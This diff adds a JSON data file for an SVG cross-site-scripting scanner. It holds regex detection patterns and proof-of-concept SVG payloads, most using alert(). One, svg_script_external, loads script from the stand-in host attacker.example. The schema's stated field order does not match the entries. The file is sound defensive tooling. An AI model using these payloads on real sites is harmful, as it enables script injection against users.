@@ -1,0 +1,265 @@
+{
+  "_meta": {
+    "note": "SVG XSS detection vectors. Moved out of svg_xss.py (~300 lines of literal tuples); that module re-compiles the regexes at import.",
+    "schema": {
+      "svg_raw_patterns": "[[regex, vector_type, name, description], ...]",
+      "poc_payloads": "vector_type -> payload snippet",
+      "severity_rank": "severity -> rank"
+    },
+    "version": 1
+  },
+  "svg_raw_patterns": [
+    [
+      "<svg[^>]*>[\\s\\S]*?<script\\b",
+      "SVG <script> element executes JavaScript in the SVG namespace",
+      "high",
+      "svg_script"
+    ],
+    [
+      "<script\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*https?:",
+      "SVG <script> with external href loads remote JavaScript",
+      "high",
+      "svg_script_external"
+    ],
+    [
+      "<script\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <script> with javascript: URI",
+      "high",
+      "svg_script_jsuri"
+    ],
+    [
+      "<foreignObject\\b[^>]*>[\\s\\S]*?<script\\b",
+      "SVG <foreignObject> with embedded <script> (HTML namespace)",
+      "high",
+      "svg_foreignobject_script"
+    ],
+    [
+      "<foreignObject\\b[^>]*>[\\s\\S]*?<iframe\\b",
+      "SVG <foreignObject> with embedded <iframe>",
+      "high",
+      "svg_foreignobject_iframe"
+    ],
+    [
+      "<foreignObject\\b[^>]*>[\\s\\S]*?\\bon\\w+\\s*=\\s*['\\\"]",
+      "SVG <foreignObject> with inline event handler",
+      "high",
+      "svg_foreignobject_event"
+    ],
+    [
+      "<foreignObject\\b[^>]*>[\\s\\S]*?javascript:",
+      "SVG <foreignObject> with javascript: URI",
+      "high",
+      "svg_foreignobject_jsuri"
+    ],
+    [
+      "<foreignObject\\b",
+      "SVG <foreignObject> element (review for HTML/script injection)",
+      "medium",
+      "svg_foreignobject"
+    ],
+    [
+      "<use\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <use> with javascript: href (script execution on use)",
+      "high",
+      "svg_use_jsuri"
+    ],
+    [
+      "<use\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*data:",
+      "SVG <use> with data: href (potential script carrier)",
+      "high",
+      "svg_use_data"
+    ],
+    [
+      "<use\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*https?:",
+      "SVG <use> with external http(s) href (cross-document script risk)",
+      "medium",
+      "svg_use_external"
+    ],
+    [
+      "<set\\b[^>]*\\battributeName\\s*=\\s*['\\\"]\\s*on\\w+['\\\"]",
+      "SVG <set> writes to an event handler attribute (SMIL-based XSS)",
+      "high",
+      "svg_set_event"
+    ],
+    [
+      "<set\\b[^>]*\\battributeName\\s*=\\s*['\\\"]\\s*(?:href|xlink:href)['\\\"][\\s\\S]*?\\bto\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <set> rewrites href to javascript: (SMIL-based XSS)",
+      "high",
+      "svg_set_href_jsuri"
+    ],
+    [
+      "<animate\\b[^>]*\\battributeName\\s*=\\s*['\\\"]\\s*on\\w+['\\\"]",
+      "SVG <animate> writes to an event handler attribute (SMIL XSS)",
+      "high",
+      "svg_animate_event"
+    ],
+    [
+      "<animate\\b[^>]*\\battributeName\\s*=\\s*['\\\"]\\s*(?:href|xlink:href)['\\\"][\\s\\S]*?\\b(?:to|values)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <animate> rewrites href to javascript: (SMIL XSS)",
+      "high",
+      "svg_animate_href_jsuri"
+    ],
+    [
+      "<animateTransform\\b[^>]*\\battributeName\\s*=\\s*['\\\"]\\s*on\\w+['\\\"]",
+      "SVG <animateTransform> writes to an event handler (SMIL XSS)",
+      "high",
+      "svg_animatetransform_event"
+    ],
+    [
+      "<animateMotion\\b[^>]*\\bon\\w+\\s*=\\s*['\\\"]",
+      "SVG <animateMotion> with inline event handler",
+      "high",
+      "svg_animatemotion_event"
+    ],
+    [
+      "<(?:set|animate|animateTransform|animateMotion)\\b[^>]*\\bonbegin\\s*=\\s*['\\\"]",
+      "SVG SMIL element with onbegin handler (auto-fires on animation start)",
+      "high",
+      "svg_smil_onbegin"
+    ],
+    [
+      "<(?:set|animate|animateTransform|animateMotion)\\b[^>]*\\bonend\\s*=\\s*['\\\"]",
+      "SVG SMIL element with onend handler",
+      "medium",
+      "svg_smil_onend"
+    ],
+    [
+      "<(?:set|animate|animateTransform|animateMotion)\\b[^>]*\\bonrepeat\\s*=\\s*['\\\"]",
+      "SVG SMIL element with onrepeat handler",
+      "medium",
+      "svg_smil_onrepeat"
+    ],
+    [
+      "<a\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <a> with javascript: href (click-triggered XSS)",
+      "high",
+      "svg_a_jsuri"
+    ],
+    [
+      "<a\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*data:text/html",
+      "SVG <a> with data:text/html href (click-triggered XSS)",
+      "medium",
+      "svg_a_data"
+    ],
+    [
+      "<image\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <image> with javascript: href (legacy XSS vector)",
+      "high",
+      "svg_image_jsuri"
+    ],
+    [
+      "<image\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*data:",
+      "SVG <image> with data: href (potential script carrier)",
+      "medium",
+      "svg_image_data"
+    ],
+    [
+      "<handler\\b[^>]*\\bev:event\\s*=",
+      "SVG <handler> element binds script to an event (SVG 1.1)",
+      "high",
+      "svg_handler"
+    ],
+    [
+      "<listener\\b[^>]*\\b(?:handler|event)\\s*=",
+      "SVG <listener> element (SVG 1.2 event binding)",
+      "medium",
+      "svg_listener"
+    ],
+    [
+      "<discard\\b[^>]*\\bhref\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <discard> with javascript: href (SVG 2 XSS)",
+      "high",
+      "svg_discard_jsuri"
+    ],
+    [
+      "<discard\\b",
+      "SVG <discard> element (SVG 2, review for event triggering)",
+      "low",
+      "svg_discard"
+    ],
+    [
+      "<(?:svg|image|rect|circle|ellipse|line|polyline|polygon|path|text|tspan|g|defs|symbol|use|switch|mask|pattern|marker|clipPath|filter|linearGradient|radialGradient)\\b[^>]*\\bonload\\s*=\\s*['\\\"]",
+      "SVG element with onload handler (auto-fires on render)",
+      "high",
+      "svg_onload"
+    ],
+    [
+      "<(?:svg|image|rect|circle|ellipse|line|polyline|polygon|path|text|tspan|g|defs|symbol|use|switch|mask|pattern)\\b[^>]*\\bonclick\\s*=\\s*['\\\"]",
+      "SVG element with onclick handler (click-triggered XSS)",
+      "medium",
+      "svg_onclick"
+    ],
+    [
+      "<(?:svg|image|rect|circle|ellipse|line|polyline|polygon|path|text|tspan|g|defs|symbol|use|switch|mask|pattern)\\b[^>]*\\bon\\w+\\s*=\\s*['\\\"]",
+      "SVG element with inline event handler",
+      "medium",
+      "svg_event_handler"
+    ],
+    [
+      "<svg[^>]*>[\\s\\S]*?<style\\b[^>]*>[\\s\\S]*?expression\\s*\\(",
+      "SVG <style> with expression() (legacy IE CSS XSS)",
+      "high",
+      "svg_style_expression"
+    ],
+    [
+      "<svg[^>]*>[\\s\\S]*?<style\\b[^>]*>[\\s\\S]*?-moz-binding\\s*:",
+      "SVG <style> with -moz-binding (legacy Firefox XSS)",
+      "high",
+      "svg_style_mozbinding"
+    ],
+    [
+      "<svg[^>]*>[\\s\\S]*?<style\\b[^>]*>[\\s\\S]*?behavior\\s*:\\s*url",
+      "SVG <style> with behavior:url() (IE HTC XSS)",
+      "high",
+      "svg_style_behavior"
+    ],
+    [
+      "<text\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <text> with javascript: href (click-triggered XSS)",
+      "high",
+      "svg_text_jsuri"
+    ],
+    [
+      "<tref\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <tref> with javascript: href",
+      "high",
+      "svg_tref_jsuri"
+    ],
+    [
+      "<altGlyph\\b[^>]*\\b(?:xlink:href|href)\\s*=\\s*['\\\"]\\s*javascript:",
+      "SVG <altGlyph> with javascript: href",
+      "high",
+      "svg_altglyph_jsuri"
+    ]
+  ],
+  "poc_payloads": {
+    "svg_script": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(\"XSS:svg_script\")</script></svg>",
+    "svg_script_external": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script xlink:href=\"https://attacker.example/x.js\"/></svg>",
+    "svg_script_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script xlink:href=\"javascript:alert('XSS:svg_script_jsuri')\"/></svg>",
+    "svg_foreignobject_script": "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100%\" height=\"100%\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(\"XSS:svg_foreignobject_script\")</script></body></foreignObject></svg>",
+    "svg_foreignobject_iframe": "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100%\" height=\"100%\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><iframe src=\"javascript:alert('XSS:svg_foreignobject_iframe')\"></iframe></body></foreignObject></svg>",
+    "svg_foreignobject_event": "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100%\" height=\"100%\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><div onload=\"alert('XSS:svg_foreignobject_event')\">x</div></body></foreignObject></svg>",
+    "svg_foreignobject_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\"><foreignObject width=\"100%\" height=\"100%\"><body xmlns=\"http://www.w3.org/1999/xhtml\"><a href=\"javascript:alert('XSS:svg_foreignobject_jsuri')\">click</a></body></foreignObject></svg>",
+    "svg_use_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\"><use xlink:href=\"javascript:alert('XSS:svg_use_jsuri')\"/></svg>",
+    "svg_use_data": "<svg xmlns=\"http://www.w3.org/2000/svg\"><use xlink:href=\"data:image/svg+xml,&lt;svg/&gt;\"/></svg>",
+    "svg_set_event": "<svg xmlns=\"http://www.w3.org/2000/svg\"><set attributeName=\"onload\" to=\"alert('XSS:svg_set_event')\"/><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_set_href_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:void(0)\"><set attributeName=\"xlink:href\" to=\"javascript:alert('XSS:svg_set_href_jsuri')\"/>click</a></svg>",
+    "svg_animate_event": "<svg xmlns=\"http://www.w3.org/2000/svg\"><animate attributeName=\"onload\" to=\"alert('XSS:svg_animate_event')\" dur=\"1s\"/><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_animate_href_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:void(0)\"><animate attributeName=\"xlink:href\" values=\"javascript:alert('XSS:svg_animate_href_jsuri')\" dur=\"1s\"/>click</a></svg>",
+    "svg_animatetransform_event": "<svg xmlns=\"http://www.w3.org/2000/svg\"><animateTransform attributeName=\"onload\" to=\"alert('XSS:svg_animatetransform_event')\" type=\"rotate\" dur=\"1s\"/><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_animatemotion_event": "<svg xmlns=\"http://www.w3.org/2000/svg\"><animateMotion onbegin=\"alert('XSS:svg_animatemotion_event')\" dur=\"1s\" path=\"M0,0 L100,100\"/><rect width=\"10\" height=\"10\"/></svg>",
+    "svg_smil_onbegin": "<svg xmlns=\"http://www.w3.org/2000/svg\"><set onbegin=\"alert('XSS:svg_smil_onbegin')\" attributeName=\"x\" to=\"0\" dur=\"1s\"/><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_a_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><a xlink:href=\"javascript:alert('XSS:svg_a_jsuri')\"><text>click</text></a></svg>",
+    "svg_image_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><image xlink:href=\"javascript:alert('XSS:svg_image_jsuri')\" width=\"100\" height=\"100\"/></svg>",
+    "svg_handler": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:ev=\"http://www.w3.org/2001/xml-events\"><rect width=\"100\" height=\"100\"><handler ev:event=\"click\" type=\"application/ecmascript\">alert(\"XSS:svg_handler\")</handler></rect></svg>",
+    "svg_discard_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><discard href=\"javascript:alert('XSS:svg_discard_jsuri')\" begin=\"0s\"/><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_onload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert('XSS:svg_onload')\"><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_style_expression": "<svg xmlns=\"http://www.w3.org/2000/svg\"><style>rect{x:expression(alert('XSS:svg_style_expression'))}</style><rect width=\"100\" height=\"100\"/></svg>",
+    "svg_text_jsuri": "<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"><text xlink:href=\"javascript:alert('XSS:svg_text_jsuri')\">click</text></svg>"
+  },
+  "severity_rank": {
+    "high": 3,
+    "medium": 2,
+    "low": 1
+  }
+}
